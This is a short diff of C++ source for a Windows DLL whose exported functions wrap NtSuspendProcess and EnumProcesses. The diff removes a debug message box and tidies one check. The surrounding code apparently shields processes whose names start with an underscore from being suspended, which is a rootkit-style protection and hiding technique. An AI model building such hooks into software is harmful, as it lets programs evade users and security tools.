@@ -89,8 +89,6 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntsusp(HANDLE process_handle)
 	if (success && name_buffer[0] == L'_')
 		return STATUS_ACCESS_DENIED; // RETURN ACCESS DENIED
 
-	MessageBoxA(0, "SUSPENDING", 0, 0);
-
 	auto function_pointer = GetProcAddress(GetModuleHandleA("ntdll"), "NtSuspendProcess");
 	return reinterpret_cast<NtSuspendProcesss_t>(function_pointer)(process_handle);
 }
@@ -207,9 +205,7 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
  */
 extern "C" BOOL __declspec(dllexport) WINAPI enump(DWORD* process_ids, DWORD cb, DWORD* bytes_returned_ptr)
 {
-	auto result = K32EnumProcesses(process_ids, cb, bytes_returned_ptr);
-
-	if (!result)
+	if (!K32EnumProcesses(process_ids, cb, bytes_returned_ptr))
 		return false; // NO NEED TO DO ANYTHING IF THE FUNCTION FAILS
 
 	
